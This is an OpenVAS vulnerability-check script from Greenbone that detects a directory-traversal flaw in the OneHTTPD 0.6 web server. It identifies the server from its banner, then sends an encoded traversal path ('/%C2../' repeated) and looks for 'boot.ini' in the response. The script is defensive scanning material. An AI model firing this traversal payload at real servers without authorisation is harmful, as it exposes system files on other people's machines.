###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_OneHTTPD_39757.nasl 14 2013-10-27 12:33:37Z jan $
#
# OneHTTPD Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "OneHTTPD is prone to a directory-traversal vulnerability because it
fails to sufficiently sanitize user-supplied input data.

Exploiting the issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

OneHTTPD 0.6 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100620);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)");
 script_bugtraq_id(39757);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("OneHTTPD Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39757");
 script_xref(name : "URL" , value : "http://code.google.com/p/onehttpd");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if OneHTTPD is prone to a directory-traversal vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Server: onehttpd" >!< banner)exit(0);

url = string("/%C2../%C2../%C2../%C2../%C2../%C2../%C2../%C2../");

if(http_vuln_check(port:port, url:url,pattern:"boot\.ini")) {
  security_warning(port:port);
  exit(0);
}

exit(0);
